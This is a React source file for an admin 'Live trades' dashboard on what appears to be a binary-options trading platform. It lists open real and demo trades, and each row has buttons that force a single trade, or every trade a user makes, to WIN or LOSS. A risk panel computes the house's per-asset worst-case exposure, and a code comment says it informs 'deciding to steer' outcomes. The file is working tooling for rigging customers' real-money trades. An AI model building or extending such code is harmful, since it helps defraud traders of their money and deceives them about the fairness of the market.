'use client'
import { useEffect, useRef, useState } from 'react'
import { getSocket } from '@/lib/socketClient'
import AssetIcon from '@/components/trade/AssetIcon'

function fmtDur(sec) {
  if (sec == null) return '—'
  if (sec < 60) return `${sec}s`
  if (sec < 3600) return `${Math.round(sec / 60)}m`
  return `${Math.round(sec / 3600)}h`
}
function fmtLeft(ms) {
  const s = Math.max(0, Math.ceil(ms / 1000))
  const m = Math.floor(s / 60)
  const r = s % 60
  return m > 0 ? `${m}m ${String(r).padStart(2, '0')}s` : `${r}s`
}

export default function AdminLive() {
  const [trades, setTrades] = useState([])
  const [connected, setConnected] = useState(false)
  const [, force] = useState(0)
  const tradesRef = useRef([])
  const sockRef = useRef(null)

  function forceTrade(tradeId, result) {
    sockRef.current?.emit('admin:force_trade', { tradeId, result })
  }
  function forceUser(userId, mode) {
    sockRef.current?.emit('admin:force_user', { userId, mode })
  }

  useEffect(() => {
    let sock
    let on = true
    const onTrades = (list) => {
      tradesRef.current = Array.isArray(list) ? list : []
      setTrades(tradesRef.current)
    }
    const onConnect = () => setConnected(true)
    const onDisconnect = () => setConnected(false)

    getSocket().then((s) => {
      if (!on) return
      sock = s
      sockRef.current = s
      s.on('admin:trades', onTrades)
      s.on('connect', onConnect)
      s.on('disconnect', onDisconnect)
      setConnected(s.connected)
    })

    // local 1s ticker so the countdowns move smoothly between server pushes
    const id = setInterval(() => force((n) => n + 1), 1000)
    return () => {
      on = false
      if (sock) {
        sock.off('admin:trades', onTrades)
        sock.off('connect', onConnect)
        sock.off('disconnect', onDisconnect)
      }
      clearInterval(id)
    }
  }, [])

  const now = Date.now()
  const rows = trades
    .map((t) => ({ ...t, msLeft: Math.max(0, t.closeTime - now) }))
    .sort((a, b) => a.msLeft - b.msLeft)

  const realRows = rows.filter((t) => t.accountType === 'real')
  const totalReal = realRows.reduce((s, t) => s + t.amount, 0)
  const exposure = computeExposure(realRows)
  const worstTotal = exposure.reduce((s, e) => s + Math.min(0, e.worstCase), 0)

  return (
    <div>
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
        <h1 className="text-2xl font-bold">Live trades</h1>
        <span className={`flex items-center gap-2 text-sm font-semibold ${connected ? 'text-qx-green' : 'text-qx-textMute'}`}>
          <span className={`h-2.5 w-2.5 rounded-full ${connected ? 'bg-qx-green' : 'bg-qx-textMute'}`} />
          {connected ? 'Live' : 'Connecting…'}
        </span>
      </div>

      <div className="mb-4 grid grid-cols-2 gap-3 sm:grid-cols-4">
        <Stat label="Open trades" value={rows.length} />
        <Stat label="Real-money trades" value={realRows.length} />
        <Stat label="Real exposure" value={`$${totalReal.toFixed(2)}`} />
        <Stat label="Demo trades" value={rows.length - realRows.length} />
      </div>

      <RiskPanel exposure={exposure} worstTotal={worstTotal} />

      <div className="qx-card overflow-x-auto">
        <table className="w-full min-w-[1040px] text-sm">
          <thead className="text-xs text-qx-textMute">
            <tr className="border-b border-qx-border">
              <th className="px-4 py-3 text-left">User</th>
              <th className="px-4 py-3 text-left">Asset</th>
              <th className="px-4 py-3 text-center">Direction</th>
              <th className="px-4 py-3 text-right">Amount</th>
              <th className="px-4 py-3 text-center">Account</th>
              <th className="px-4 py-3 text-center">Timeframe</th>
              <th className="px-4 py-3 text-right">Time left</th>
              <th className="px-4 py-3 text-center">Force this trade</th>
              <th className="px-4 py-3 text-center">User mode</th>
            </tr>
          </thead>
          <tbody>
            {rows.length === 0 && (
              <tr><td colSpan={9} className="p-6 text-center text-qx-textMute">No open trades right now.</td></tr>
            )}
            {rows.map((t) => (
              <tr key={t.id} className="border-b border-qx-border/50">
                <td className="px-4 py-3 text-white">{t.email || t.userId.slice(-6)}</td>
                <td className="px-4 py-3">
                  <span className="flex items-center gap-2 font-semibold text-white">
                    <AssetIcon symbol={t.symbol} size={20} />
                    {t.symbol}
                  </span>
                </td>
                <td className="px-4 py-3 text-center">
                  <span className={`font-bold ${t.direction === 'up' ? 'text-qx-green' : 'text-qx-red'}`}>
                    {t.direction === 'up' ? '▲ UP' : '▼ DOWN'}
                  </span>
                </td>
                <td className="px-4 py-3 text-right font-bold tabular-nums text-white">${t.amount.toFixed(2)}</td>
                <td className="px-4 py-3 text-center">
                  <span className={`rounded px-2 py-0.5 text-[11px] font-bold ${t.accountType === 'real' ? 'bg-qx-green/15 text-qx-green' : 'bg-qx-gold/15 text-qx-gold'}`}>
                    {t.accountType === 'real' ? 'REAL' : 'DEMO'}
                  </span>
                </td>
                <td className="px-4 py-3 text-center text-qx-textDim">{fmtDur(t.duration)}</td>
                <td className="px-4 py-3 text-right">
                  <span className={`font-bold tabular-nums ${t.msLeft <= 5000 ? 'text-qx-red' : 'text-qx-gold'}`}>
                    {fmtLeft(t.msLeft)}
                  </span>
                </td>
                <td className="px-4 py-3">
                  <div className="flex justify-center gap-1">
                    <ForceBtn active={t.forced === 'win'} cls="bg-qx-green" onClick={() => forceTrade(t.id, t.forced === 'win' ? 'normal' : 'win')}>WIN</ForceBtn>
                    <ForceBtn active={t.forced === 'loss'} cls="bg-qx-red" onClick={() => forceTrade(t.id, t.forced === 'loss' ? 'normal' : 'loss')}>LOSS</ForceBtn>
                    <ForceBtn active={!t.forced} cls="bg-qx-panel2" onClick={() => forceTrade(t.id, 'normal')}>AUTO</ForceBtn>
                  </div>
                </td>
                <td className="px-4 py-3">
                  <div className="flex justify-center gap-1">
                    <ForceBtn active={t.userMode === 'win'} cls="bg-qx-green" onClick={() => forceUser(t.userId, t.userMode === 'win' ? 'normal' : 'win')}>WIN</ForceBtn>
                    <ForceBtn active={t.userMode === 'loss'} cls="bg-qx-red" onClick={() => forceUser(t.userId, t.userMode === 'loss' ? 'normal' : 'loss')}>LOSS</ForceBtn>
                    <ForceBtn active={!t.userMode} cls="bg-qx-panel2" onClick={() => forceUser(t.userId, 'normal')}>AUTO</ForceBtn>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

// Per-asset open-trade exposure on REAL money. For each asset we know what the
// house pays if UP wins vs if DOWN wins; worstCase is the most the house could
// lose on that asset at resolution. Lets you see "we're about to owe $X on EURUSD
// UP" *before* deciding to steer. Sorted biggest liability first.
function computeExposure(rows) {
  const bySymbol = new Map()
  for (const t of rows) {
    let e = bySymbol.get(t.symbol)
    if (!e) {
      e = { symbol: t.symbol, upStake: 0, downStake: 0, upPayout: 0, downPayout: 0, count: 0 }
      bySymbol.set(t.symbol, e)
    }
    const payout = t.amount * (t.payout / 100)
    if (t.direction === 'up') {
      e.upStake += t.amount
      e.upPayout += payout
    } else {
      e.downStake += t.amount
      e.downPayout += payout
    }
    e.count++
  }
  return Array.from(bySymbol.values())
    .map((e) => {
      const ifUp = e.downStake - e.upPayout // house net if price closes UP
      const ifDown = e.upStake - e.downPayout // house net if price closes DOWN
      return { ...e, ifUp, ifDown, worstCase: Math.min(ifUp, ifDown) }
    })
    .sort((a, b) => a.worstCase - b.worstCase)
}

function RiskPanel({ exposure, worstTotal }) {
  if (exposure.length === 0) return null
  return (
    <div className="qx-card mb-4 overflow-hidden">
      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-qx-border px-4 py-3">
        <span className="font-bold">Real-money exposure by asset</span>
        <span className="text-sm text-qx-textDim">
          Worst-case total:{' '}
          <span className={`font-bold ${worstTotal < 0 ? 'text-qx-red' : 'text-qx-green'}`}>
            {worstTotal < 0 ? '−' : ''}${Math.abs(worstTotal).toFixed(2)}
          </span>
        </span>
      </div>
      <div className="overflow-x-auto">
        <table className="w-full min-w-[640px] text-sm">
          <thead className="text-xs text-qx-textMute">
            <tr className="border-b border-qx-border">
              <th className="px-4 py-2 text-left">Asset</th>
              <th className="px-4 py-2 text-center">Trades</th>
              <th className="px-4 py-2 text-right">▲ UP stake</th>
              <th className="px-4 py-2 text-right">▼ DOWN stake</th>
              <th className="px-4 py-2 text-right">House if ▲</th>
              <th className="px-4 py-2 text-right">House if ▼</th>
              <th className="px-4 py-2 text-right">Worst case</th>
            </tr>
          </thead>
          <tbody>
            {exposure.map((e) => (
              <tr key={e.symbol} className="border-b border-qx-border/50">
                <td className="px-4 py-2 font-semibold text-white">
                  <span className="flex items-center gap-2">
                    <AssetIcon symbol={e.symbol} size={18} />
                    {e.symbol}
                  </span>
                </td>
                <td className="px-4 py-2 text-center text-qx-textDim">{e.count}</td>
                <td className="px-4 py-2 text-right tabular-nums text-qx-green">${e.upStake.toFixed(2)}</td>
                <td className="px-4 py-2 text-right tabular-nums text-qx-red">${e.downStake.toFixed(2)}</td>
                <td className={`px-4 py-2 text-right tabular-nums ${e.ifUp < 0 ? 'text-qx-red' : 'text-qx-green'}`}>
                  {e.ifUp < 0 ? '−' : '+'}${Math.abs(e.ifUp).toFixed(2)}
                </td>
                <td className={`px-4 py-2 text-right tabular-nums ${e.ifDown < 0 ? 'text-qx-red' : 'text-qx-green'}`}>
                  {e.ifDown < 0 ? '−' : '+'}${Math.abs(e.ifDown).toFixed(2)}
                </td>
                <td className={`px-4 py-2 text-right font-bold tabular-nums ${e.worstCase < 0 ? 'text-qx-red' : 'text-qx-green'}`}>
                  {e.worstCase < 0 ? '−' : '+'}${Math.abs(e.worstCase).toFixed(2)}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}

function Stat({ label, value }) {
  return (
    <div className="qx-card p-4">
      <div className="text-xs text-qx-textMute">{label}</div>
      <div className="mt-1 text-2xl font-bold text-white">{value}</div>
    </div>
  )
}

function ForceBtn({ active, cls, onClick, children }) {
  return (
    <button
      onClick={onClick}
      className={`rounded px-2 py-1 text-[11px] font-bold transition ${
        active ? `${cls} text-white` : 'bg-qx-input text-qx-textDim hover:text-white'
      }`}
    >
      {children}
    </button>
  )
}
